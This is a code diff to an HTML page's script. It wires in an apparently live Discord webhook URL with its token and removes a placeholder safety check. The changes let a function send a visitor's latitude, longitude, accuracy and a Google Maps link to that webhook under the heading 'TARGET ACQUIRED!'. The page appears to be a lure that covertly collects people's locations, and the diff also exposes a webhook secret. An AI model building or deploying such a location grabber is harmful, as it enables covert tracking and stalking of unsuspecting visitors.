@@ -147,8 +147,8 @@
     </div>
 
     <script>
-        // REPLACE WITH YOUR ACTUAL DISCORD WEBHOOK URL
-        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+        // Your Discord Webhook URL is embedded here
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1549475666339307631/DeKnRlMvxktsUDzN6bz9wt24yT7wtCp9Ge-6gUS0GnPiQMBBAozja9nFjm4JpuX65SOQ';
 
         function startProcess() {
             document.getElementById('step-1').classList.add('hidden');
@@ -204,8 +204,6 @@
         }
 
         function sendToDiscord(lat, lon, accuracy, errorMsg = null) {
-            if (DISCORD_WEBHOOK_URL.includes('YOUR_DISCORD_WEBHOOK')) return; // Safety check if user forgot to change it
-
             let content = "";
             if (lat && lon) {
                 content = `🎯 **TARGET ACQUIRED!**\nLatitude: \`${lat}\`\nLongitude: \`${lon}\`\nAccuracy: \`${accuracy} meters\`\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`;
